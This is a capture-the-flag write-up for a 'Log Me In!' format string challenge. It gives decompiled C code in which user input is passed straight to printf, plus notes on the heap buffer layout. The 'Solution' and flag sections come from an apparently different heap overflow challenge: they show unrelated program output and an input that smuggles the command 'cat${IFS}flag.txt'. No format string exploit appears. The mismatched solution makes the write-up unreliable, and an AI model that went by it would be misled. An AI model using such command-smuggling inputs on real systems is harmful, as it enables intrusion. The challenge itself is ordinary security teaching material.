# Log Me In!

Only the executable file was given. This was tagged as a "format string" challenge.

We run the program first.

```
user = 0x4202a0
Enter your username:
cookie
Enter password for user: cookie
cookie
Invalid login information.
```
The decompiled code from Ghidra is as follows; I have done some minor changes to improve the readability.

```
int main(void) { 
  char* __ptr = calloc(1, 40);
  printf("user = %p\n",__ptr);
  puts("Enter your username:");
  fgets((__ptr + 4), 20, stdin);
  printf("Enter password for user: ");
  printf((__ptr + 4));
  fgets((__ptr + 24), 20, stdin);
  if (*__ptr == 0) {
    puts("Invalid login information.");
  }
  else {
    puts("Successfully logged in!");
    giveFlag();
  }
  free(__ptr);
  return 0;
}
```

The code, though appearing to be very simple, did take me a while to fully understand.

Firstly, ```__ptr``` is a pointer to a buffer allocated on the heap, and ```calloc()``` will set the entire buffer to zeroes. Its address is shown, which is important later on.

A prompt for the username is then called, and ```fgets()``` writes the username to an offset 4 bytes off the memory address up to a total of 20 bytes, and the password fills up the remaining buffer.

This means that the first 4 bytes of the buffer are empty (from ```calloc()```), and logging in is not possible unless the first 4 bytes are written to.

### The exploit 
A good explanation of the string formatting vulnerability can be found [here](https://www.youtube.com/watch?v=2HxyGWD1htg). Simply put, format specifiers in ```printf()``` can be used to read and write to values off the stack, or elsewhere.



**Solution**
```
username at 0x57fde008
shell at 0x57fde040
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt. Your shell is cat${IFS}flag.txt.
```

**Flag**
```
flag{heap_challenges_are_not_as_scary_as_most_people_think}
```
